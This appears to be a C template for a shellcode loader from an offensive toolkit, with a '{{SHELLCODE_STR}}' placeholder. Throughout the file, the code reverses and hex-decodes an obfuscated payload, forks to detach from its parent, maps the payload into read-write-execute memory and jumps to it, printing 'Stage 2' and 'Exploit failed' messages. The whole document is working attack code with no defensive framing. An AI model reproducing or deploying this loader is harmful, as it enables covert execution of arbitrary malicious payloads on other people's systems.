#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>

unsigned char hexbuffer[] = "{{SHELLCODE_STR}}";

void StringToHex(char* str, unsigned char* out) {
    char* p = str;
    char high = 0, low = 0;
    int tmplen = strlen(p);
    int cnt = 0;
    tmplen = strlen(p);
    while (cnt < (tmplen / 2)) {
        high = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
        low = (*(++p) > '9' && ((*p <= 'F') || (*p <= 'f'))) ? *(p)-48 - 7 : *(p)-48;
        out[cnt] = ((high & 0x0f) << 4 | (low & 0x0f));
        p++;
        cnt++;
    }
    if (tmplen % 2 != 0) out[cnt] = ((*p > '9') && ((*p <= 'F') || (*p <= 'f'))) ? *p - 48 - 7 : *p - 48;
    return;
}

char *strrev(char *str)
{
    char *p1, *p2;

    if (! str || ! *str)
        return str;
    for (p1 = str, p2 = str + strlen(str) - 1; p2 > p1; ++p1, --p2)
    {
        *p1 ^= *p2;
        *p2 ^= *p1;
        *p1 ^= *p2;
    }
    return str;
}

int main(int argc, char **argv)
{
    pid_t process_id = 0;
    pid_t sid = 0;
    process_id = fork();
    if (process_id < 0)
    {
        printf("fork failed!\n");
        exit(1);
    }
    if (process_id > 0)
    {
        printf("[+] Stage 2\n");
        exit(0);
    }
    strrev(hexbuffer);
    unsigned char buffer[409600] = { 0 };
    StringToHex(hexbuffer, buffer);
    void *ptr = mmap(0, sizeof(buffer), PROT_WRITE|PROT_READ|PROT_EXEC, MAP_ANON | MAP_PRIVATE, -1, 0);
    memcpy(ptr,buffer,sizeof buffer);
    void (*fp)() = (void (*)())ptr;
    fp();
    printf ("\n[-] Exploit failed \n");
}